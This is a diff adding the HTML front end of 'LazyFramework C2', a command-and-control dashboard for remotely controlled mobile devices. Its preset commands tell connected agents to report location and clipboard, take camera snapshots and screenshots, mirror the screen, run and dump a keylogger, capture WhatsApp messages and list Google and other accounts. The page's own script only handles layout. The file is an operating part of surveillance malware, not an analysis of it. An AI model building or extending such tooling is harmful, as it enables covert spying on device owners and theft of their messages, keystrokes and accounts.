@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LazyFramework C2 Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="/static/js/script.js" defer></script>
+</head>
+<body>
+    <div class="app-container" id="appContainer">
+        <!-- ==================== HEADER ==================== -->
+        <header>
+            <div class="header-left">
+                <button class="hamburger" id="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+                <h1>🎯 LazyFramework C2</h1>
+            </div>
+
+            <div class="header-right">
+                <div class="status">
+                    <span class="status-indicator" id="status-indicator"></span>
+                    <span class="status-text" id="status-text">Connecting...</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- ==================== SIDEBAR ==================== -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title">System</div>
+                <div class="sidebar-item active" data-tab="output">📋 Dashboard</div>
+                <div class="sidebar-item" data-tab="screenshot">📸 Screenshots</div>
+                <div class="sidebar-item" data-tab="livemirror">📺 Live Mirror</div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title">Data Capture</div>
+                <div class="sidebar-item" data-tab="keylog">⌨️ Keylogs</div>
+                <div class="sidebar-item" data-tab="whatsapp">💬 Messages</div>
+                <div class="sidebar-item" data-tab="wallpaper">🖼️ Wallpaper</div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title">Tools</div>
+                <div class="sidebar-item">📁 File Manager</div>
+                <div class="sidebar-item">🔐 Encryption</div>
+                <div class="sidebar-item">⚙️ Settings</div>
+            </div>
+        </aside>
+
+        <!-- ==================== MAIN CONTENT ==================== -->
+        <main class="main-content">
+            <div class="container">
+                <!-- Stats Grid -->
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-label">📱 Total Agents</div>
+                        <div class="stat-value accent" id="agent-count">0</div>
+                        <div class="stat-trend">Active connections</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">🟢 Online Now</div>
+                        <div class="stat-value success" id="online-count">0</div>
+                        <div class="stat-trend">Last 24 hours</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">⚡ Commands Sent</div>
+                        <div class="stat-value warning" id="command-count">0</div>
+                        <div class="stat-trend">This session</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">🔄 Mirroring</div>
+                        <div class="stat-value accent" id="mirror-count">0</div>
+                        <div class="stat-trend">Active streams</div>
+                    </div>
+                </div>
+
+                <!-- Controls Section -->
+                <div class="controls-section">
+                    <div class="controls-header">🎮 Command Control</div>
+                    
+                    <div class="command-input-group">
+                        <input type="text" id="command-input" placeholder="Enter command or select preset below...">
+                        <button id="send-command-btn">Send</button>
+                    </div>
+
+                    <div class="command-presets">
+                        <!-- System Commands -->
+                        <button class="preset-btn" data-cmd="GET_DEVICE_INFO">📱 Device</button>
+                        <button class="preset-btn" data-cmd="GET_LOCATION">📍 Location</button>
+                        <button class="preset-btn" data-cmd="GET_CLIPBOARD">📋 Clipboard</button>
+                        
+                        <!-- Screenshot & Camera -->
+                        <button class="preset-btn" data-cmd="SCREENSHOT">📸 Screenshot</button>
+                        <button class="preset-btn" data-cmd="CAMERA_SNAPSHOT">📷 Camera</button>
+                        <button class="preset-btn" data-cmd="CAMERA_SNAPSHOT back">📷 Back Cam</button>
+                        <button class="preset-btn" data-cmd="CAMERA_SNAPSHOT front">🤳 Front Cam</button>
+                        
+                        <!-- Screen Mirror -->
+                        <button class="preset-btn" data-cmd="SCREEN_START">🔄 Mirror Start</button>
+                        <button class="preset-btn" data-cmd="SCREEN_STOP">⏹️ Mirror Stop</button>
+                        
+                        <!-- Keylogger -->
+                        <button class="preset-btn" data-cmd="KEYLOG_START">⌨️ Keylog On</button>
+                        <button class="preset-btn" data-cmd="KEYLOG_DUMP">📄 Keylog Dump</button>
+                        <button class="preset-btn" data-cmd="KEYLOG_STOP">⌨️ Keylog Off</button>
+                        
+                        <!-- WhatsApp -->
+                        <button class="preset-btn" data-cmd="WA_CAPTURE_START">💬 WA Start</button>
+                        <button class="preset-btn" data-cmd="WA_CAPTURE_DUMP">💬 WA Dump</button>
+                        <button class="preset-btn" data-cmd="WA_CAPTURE_STOP">💬 WA Stop</button>
+                        
+                        <!-- Accounts -->
+                        <button class="preset-btn" data-cmd="GET_ACCOUNTS">👤 All Accounts</button>
+                        <button class="preset-btn" data-cmd="GET_GOOGLE_ACCOUNTS">🔵 Google Acc</button>
+                        
+                        <!-- Help -->
+                        <button class="preset-btn" data-cmd="HELP">❓ Help</button>
+                    </div>
+                </div>
+
+                <!-- Dashboard Grid -->
+                <div class="dashboard-grid">
+                    <!-- Agents Panel -->
+                    <div class="agents-panel">
+                        <div class="panel-header">
+                            <h2>📱 Connected Agents</h2>
+                            <button id="refresh-agents" title="Refresh agent list">⟳</button>
+                        </div>
+                        <div id="agent-list">
+                            <div class="loading">Loading agents...</div>
+                        </div>
+                    </div>
+
+                    <!-- Output Panel -->
+                    <div class="output-panel">
+                        <div class="output-tabs">
+                            <button class="tab active" data-tab="output">📋 Output</button>
+                            <button class="tab" data-tab="screenshot">📸 Screenshots</button>
+                            <button class="tab" data-tab="keylog">⌨️ Keylogs</button>
+                            <button class="tab" data-tab="whatsapp">💬 WhatsApp</button>
+                            <button class="tab" data-tab="livemirror">📺 Live Mirror</button>
+                            <button class="tab" data-tab="wallpaper">🖼️ Wallpaper</button>
+                        </div>
+
+                        <div id="output-container">
+                            <!-- Output Tab -->
+                            <div id="output-tab" class="tab-content active">
+                                <div id="output-content">
+                                    <div class="info">👋 Welcome to LazyFramework C2</div>
+                                    <div class="info" style="font-size: 12px; margin-top: 12px; color: var(--text-secondary);">
+                                        Select an agent from the left panel to get started
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Screenshots Tab -->
+                            <div id="screenshot-tab" class="tab-content">
+                                <div id="screenshot-content">
+                                    <div class="info">No screenshots captured yet</div>
+                                </div>
+                            </div>
+
+                            <!-- Keylogs Tab -->
+                            <div id="keylog-tab" class="tab-content">
+                                <div id="keylog-content">
+                                    <div class="info">No keylog data available</div>
+                                </div>
+                            </div>
+
+                            <!-- WhatsApp Tab -->
+                            <div id="whatsapp-tab" class="tab-content">
+                                <div id="whatsapp-content">
+                                    <div class="info">No WhatsApp messages captured</div>
+                                </div>
+                            </div>
+
+                            <!-- Live Mirror Tab -->
+                            <div id="livemirror-tab" class="tab-content">
+                                <div id="livemirror-content">
+                                    <div class="info">📺 Live Mirror Preview</div>
+                                    <div class="info" style="font-size: 12px; margin-top: 12px; color: var(--text-secondary);">
+                                        Send <span class="code">SCREEN_START</span> command to begin streaming
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Wallpaper Tab -->
+                            <div id="wallpaper-tab" class="tab-content">
+                                <div id="wallpaper-content">
+                                    <div class="info">🖼️ Wallpaper History</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Hamburger Menu Toggle
+        document.getElementById('hamburger').addEventListener('click', function() {
+            const appContainer = document.getElementById('appContainer');
+            const hamburger = document.getElementById('hamburger');
+            appContainer.classList.toggle('sidebar-open');
+            hamburger.classList.toggle('active');
+        });
+
+        // Close sidebar when clicking on a sidebar item
+        document.querySelectorAll('.sidebar-item').forEach(item => {
+            item.addEventListener('click', function() {
+                if (window.innerWidth <= 768) {
+                    document.getElementById('appContainer').classList.remove('sidebar-open');
+                    document.getElementById('hamburger').classList.remove('active');
+                }
+            });
+        });
+
+        // Handle window resize
+        window.addEventListener('resize', function() {
+            if (window.innerWidth > 768) {
+                document.getElementById('appContainer').classList.remove('sidebar-open');
+                document.getElementById('hamburger').classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
